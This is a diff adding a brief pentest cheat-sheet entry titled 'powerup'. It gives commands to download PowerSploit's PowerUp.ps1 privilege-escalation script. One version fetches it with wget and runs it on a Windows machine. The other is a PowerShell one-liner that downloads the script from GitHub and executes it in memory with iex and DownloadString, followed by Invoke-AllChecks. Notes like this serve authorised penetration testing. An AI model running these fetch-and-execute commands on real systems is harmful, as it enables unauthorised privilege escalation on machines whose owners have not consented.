@@ -1,0 +1,11 @@
+# powerup
+
+# Download from GNU/Linux
+wget -c "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1"
+;; transfer on a Windows Machine and execute:
+. \.PowerUp.ps1
+Invoke-AllChecks
+
+## Download and Automatically Import from Windows
+powershell iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
+Invoke-AllChecks
